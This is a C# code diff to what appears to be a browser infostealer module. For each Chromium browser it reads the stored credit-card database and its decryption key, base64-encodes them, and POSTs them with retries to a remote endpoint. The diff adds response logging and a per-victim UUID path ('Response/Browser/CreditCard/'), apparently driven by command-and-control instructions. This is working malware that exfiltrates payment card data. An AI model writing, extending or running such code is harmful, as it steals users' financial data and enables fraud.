@@ -70,46 +70,46 @@ public class Script
 		while (retryCount < maxRetries)
 		{
 			try
-			{
-				var client = new HttpClient();
-				// Add the file
-				using (FileStream fileStream = new FileStream(dataPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-				using (MemoryStream memoryStream = new MemoryStream())
-				{
-					await fileStream.CopyToAsync(memoryStream);
-					string fileData = Convert.ToBase64String(memoryStream.ToArray());
-					string secretKeyString = Convert.ToBase64String(secretKey);
-					string contectData = string.Format("{{\"Key\":\"{0}\",\"Data\":\"{1}\",\"Browser\":\"{2}\"}}",
-						secretKeyString, fileData, browser.Replace(@"\", "-"));
-					var content = new StringContent(contectData, Encoding.UTF8, "application/json");
-					client.Timeout = TimeSpan.FromMinutes(10);
-					HttpResponseMessage response = await client.PostAsync(endpointUrl, content);
-					if (response.IsSuccessStatusCode)
-					{
-						break;
-					}
-					retryCount++;
-				}
+            {
+                var client = new HttpClient();
+                // Add the file
+                using (FileStream fileStream = new FileStream(dataPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                using (MemoryStream memoryStream = new MemoryStream())
+                {
+                    await fileStream.CopyToAsync(memoryStream);
+                    string fileData = Convert.ToBase64String(memoryStream.ToArray());
+                    string secretKeyString = Convert.ToBase64String(secretKey);
+                    string contectData = string.Format("{{\"Key\":\"{0}\",\"Data\":\"{1}\",\"Browser\":\"{2}\"}}",
+                    secretKeyString, fileData, browser.Replace(@"\", "-"));
+                    var content = new StringContent(contectData, Encoding.UTF8, "application/json");
+                    client.Timeout = TimeSpan.FromMinutes(10);
+                    HttpResponseMessage response = await client.PostAsync(endpointUrl, content);
+                    					Console.WriteLine("Response Status Code: " + (int)response.StatusCode + " - " + response.StatusCode);
 
-			}
-			catch
-			{
-				retryCount++;
-				if (retryCount >= maxRetries)
-				{
-					break;
-				}
+                    if (response.IsSuccessStatusCode)
+                    {
+                        break;
+                    }
+                    retryCount++;
+                }
+            }
+            catch
+            {
+                retryCount++;
+                if (retryCount >= maxRetries)
+                {
+                    break;
+                }
+            }
 
-			
-			}
 			await Task.Delay(delay);
 			delay = TimeSpan.FromSeconds(Math.Min(delay.TotalSeconds * 2, 60));
 
 		}
 	}
 	
-    public static async Task<string> ExecuteAsync(string endpoint)
-    {
+    public static async Task<object> ExecuteAsync(string endpoint, string uuid, long instructionId, short code)
+	{
         foreach (string browser in chromiumBrowsers)
             {
                   string secretKeyPath, DataPath;
@@ -132,11 +132,11 @@ public class Script
 
                 if (readSecretKey != null && File.Exists(DataPath))
                 {
-                    // Send The File And The Secret Key to an EndPoint
-                    await SendCreditCardDBWithRetry(endpoint, browser, readSecretKey, DataPath, 10);
+
+                    await SendCreditCardDBWithRetry(endpoint+ "Response/Browser/CreditCard/"+uuid, browser, readSecretKey, DataPath, 10);
                 }
             }
-            return "Done";
+            return null;
     }
 
 }
